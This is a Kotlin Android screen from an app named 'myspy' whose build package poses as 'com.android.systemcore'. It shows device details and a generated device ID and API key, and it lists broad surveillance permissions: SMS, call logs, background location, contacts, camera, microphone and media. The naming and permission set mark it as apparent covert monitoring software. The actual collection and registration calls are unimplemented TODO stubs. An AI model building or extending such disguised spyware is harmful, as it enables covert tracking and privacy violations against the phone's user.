package com.myspy.android.ui.registration

import android.Manifest
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.view.LayoutInflater
import android.view.ViewGroup
import android.widget.Toast
import android.view.View
import androidx.core.content.ContextCompat
import androidx.fragment.app.Fragment
import androidx.lifecycle.lifecycleScope
import androidx.recyclerview.widget.LinearLayoutManager
import com.android.systemcore.BuildConfig
import com.android.systemcore.databinding.FragmentRegistrationBinding
import com.android.systemcore.databinding.ItemPermissionBinding
import com.myspy.android.data.local.prefs.PreferencesManager
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.launch
import timber.log.Timber
import java.text.SimpleDateFormat
import java.util.*
import javax.inject.Inject

/**
 * Registration Fragment
 * @author Michael KOJDL
 * @version 1.0.0
 *
 * Displays:
 * - Device information (manufacturer, model, OS version)
 * - Registration details (UUID, API key, registration date)
 * - Permission status and management
 * - Registration/unregistration actions
 */
@AndroidEntryPoint
class RegistrationFragment : Fragment() {

    private var _binding: FragmentRegistrationBinding? = null
    private val binding get() = _binding!!

    @Inject
    lateinit var prefsManager: PreferencesManager

    private lateinit var permissionsAdapter: PermissionsAdapter
    private val permissions = mutableListOf<PermissionItem>()

    private val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = FragmentRegistrationBinding.inflate(inflater, container, false)
        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        loadDeviceInfo()
        loadRegistrationDetails()
        setupPermissions()
        setupListeners()
    }

    private fun loadDeviceInfo() {
        binding.textManufacturer.text = Build.MANUFACTURER
        binding.textModel.text = Build.MODEL
        binding.textOsVersion.text = "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})"
        binding.textAppVersion.text = BuildConfig.VERSION_NAME
    }

    private fun loadRegistrationDetails() {
        lifecycleScope.launch {
            try {
                val deviceId = prefsManager.getDeviceId()
                val apiKey = prefsManager.getApiKey()
                val registrationDate = prefsManager.getRegistrationDate()

                binding.textDeviceUuid.text = deviceId ?: "Not registered"
                binding.textApiKey.text = apiKey ?: "Not registered"

                if (registrationDate > 0) {
                    binding.textRegistrationDate.text = dateFormat.format(Date(registrationDate))
                } else {
                    binding.textRegistrationDate.text = "Not registered"
                }

            } catch (e: Exception) {
                Timber.e(e, "Failed to load registration details")
            }
        }
    }

    private fun setupPermissions() {
        permissions.clear()

        // Add all required permissions
        permissions.add(PermissionItem("SMS", Manifest.permission.READ_SMS))
        permissions.add(PermissionItem("Receive SMS", Manifest.permission.RECEIVE_SMS))
        permissions.add(PermissionItem("Calls", Manifest.permission.READ_CALL_LOG))
        permissions.add(PermissionItem("Phone State", Manifest.permission.READ_PHONE_STATE))
        permissions.add(PermissionItem("Location", Manifest.permission.ACCESS_FINE_LOCATION))
        permissions.add(PermissionItem("Background Location", Manifest.permission.ACCESS_BACKGROUND_LOCATION))
        permissions.add(PermissionItem("Contacts", Manifest.permission.READ_CONTACTS))
        permissions.add(PermissionItem("Camera", Manifest.permission.CAMERA))
        permissions.add(PermissionItem("Microphone", Manifest.permission.RECORD_AUDIO))

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(PermissionItem("Media Images", Manifest.permission.READ_MEDIA_IMAGES))
            permissions.add(PermissionItem("Media Video", Manifest.permission.READ_MEDIA_VIDEO))
            permissions.add(PermissionItem("Media Audio", Manifest.permission.READ_MEDIA_AUDIO))
            permissions.add(PermissionItem("Notifications", Manifest.permission.POST_NOTIFICATIONS))
        } else {
            permissions.add(PermissionItem("Storage", Manifest.permission.READ_EXTERNAL_STORAGE))
        }

        permissionsAdapter = PermissionsAdapter(permissions) { permission ->
            requestSinglePermission(permission)
        }

        binding.recyclerViewPermissions.layoutManager = LinearLayoutManager(requireContext())
        binding.recyclerViewPermissions.adapter = permissionsAdapter

        updatePermissionStatuses()
    }

    private fun setupListeners() {
        binding.btnCopyUuid.setOnClickListener {
            copyToClipboard("UUID", binding.textDeviceUuid.text.toString())
        }

        binding.btnCopyApiKey.setOnClickListener {
            copyToClipboard("API Key", binding.textApiKey.text.toString())
        }

        binding.btnRegisterDevice.setOnClickListener {
            registerDevice()
        }

        binding.btnDeleteRegistration.setOnClickListener {
            deleteRegistration()
        }

        binding.btnRequestAllPermissions.setOnClickListener {
            requestAllPermissions()
        }
    }

    private fun updatePermissionStatuses() {
        permissions.forEach { permission ->
            permission.isGranted = isPermissionGranted(permission.manifestPermission)
        }
        permissionsAdapter.notifyDataSetChanged()
    }

    private fun isPermissionGranted(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(
            requireContext(),
            permission
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun copyToClipboard(label: String, text: String) {
        val clipboard = requireContext().getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip = ClipData.newPlainText(label, text)
        clipboard.setPrimaryClip(clip)
        Toast.makeText(requireContext(), "$label copied to clipboard", Toast.LENGTH_SHORT).show()
    }

    private fun registerDevice() {
        lifecycleScope.launch {
            try {
                updateStatus("Sending registration...")

                // TODO: Implement actual registration API call
                // For now, just save local device ID
                val deviceId = UUID.randomUUID().toString()
                val apiKey = UUID.randomUUID().toString().replace("-", "")

                prefsManager.setDeviceId(deviceId)
                prefsManager.setApiKey(apiKey)
                prefsManager.setRegistrationDate(System.currentTimeMillis())

                loadRegistrationDetails()

                updateStatus("Device registered successfully")
                Toast.makeText(requireContext(), "Device registered", Toast.LENGTH_SHORT).show()

                Timber.i("Device registered: $deviceId")

            } catch (e: Exception) {
                Timber.e(e, "Registration failed")
                updateStatus("Registration failed: ${e.message}")
                Toast.makeText(requireContext(), "Registration failed", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun deleteRegistration() {
        lifecycleScope.launch {
            try {
                updateStatus("Deleting registration...")

                // TODO: Implement actual unregistration API call
                prefsManager.setDeviceId(null)
                prefsManager.setApiKey(null)
                prefsManager.setRegistrationDate(0)

                loadRegistrationDetails()

                updateStatus("Registration deleted")
                Toast.makeText(requireContext(), "Registration deleted", Toast.LENGTH_SHORT).show()

                Timber.i("Device unregistered")

            } catch (e: Exception) {
                Timber.e(e, "Unregistration failed")
                updateStatus("Unregistration failed: ${e.message}")
            }
        }
    }

    private fun requestSinglePermission(permission: PermissionItem) {
        // TODO: Implement permission request
        Toast.makeText(
            requireContext(),
            "Please grant ${permission.name} permission in app settings",
            Toast.LENGTH_SHORT
        ).show()
    }

    private fun requestAllPermissions() {
        // TODO: Implement batch permission request
        Toast.makeText(
            requireContext(),
            "Please grant all permissions in app settings",
            Toast.LENGTH_LONG
        ).show()
    }

    private fun updateStatus(message: String) {
        binding.textRegistrationStatus.text = message
    }

    override fun onResume() {
        super.onResume()
        updatePermissionStatuses()
    }

    override fun onDestroyView() {
        super.onDestroyView()
        _binding = null
    }

    /**
     * Permission Item data class
     */
    data class PermissionItem(
        val name: String,
        val manifestPermission: String,
        var isGranted: Boolean = false
    )

    /**
     * Permissions RecyclerView Adapter
     */
    private class PermissionsAdapter(
        private val permissions: List<PermissionItem>,
        private val onRequestClick: (PermissionItem) -> Unit
    ) : androidx.recyclerview.widget.RecyclerView.Adapter<PermissionViewHolder>() {

        override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): PermissionViewHolder {
            val binding = ItemPermissionBinding.inflate(
                LayoutInflater.from(parent.context),
                parent,
                false
            )
            return PermissionViewHolder(binding, onRequestClick)
        }

        override fun onBindViewHolder(holder: PermissionViewHolder, position: Int) {
            holder.bind(permissions[position])
        }

        override fun getItemCount(): Int = permissions.size
    }

    /**
     * Permission ViewHolder
     */
    private class PermissionViewHolder(
        private val binding: ItemPermissionBinding,
        private val onRequestClick: (PermissionItem) -> Unit
    ) : androidx.recyclerview.widget.RecyclerView.ViewHolder(binding.root) {

        fun bind(permission: PermissionItem) {
            binding.textPermissionName.text = permission.name
            binding.textPermissionDescription.text = permission.manifestPermission

            if (permission.isGranted) {
                binding.imagePermissionStatus.setImageResource(android.R.drawable.checkbox_on_background)
                binding.imagePermissionStatus.setColorFilter(0xFF4CAF50.toInt())
                binding.btnRequestPermission.visibility = View.GONE
            } else {
                binding.imagePermissionStatus.setImageResource(android.R.drawable.ic_menu_close_clear_cancel)
                binding.imagePermissionStatus.setColorFilter(0xFFF44336.toInt())
                binding.btnRequestPermission.visibility = View.VISIBLE
                binding.btnRequestPermission.setOnClickListener {
                    onRequestClick(permission)
                }
            }
        }
    }
}
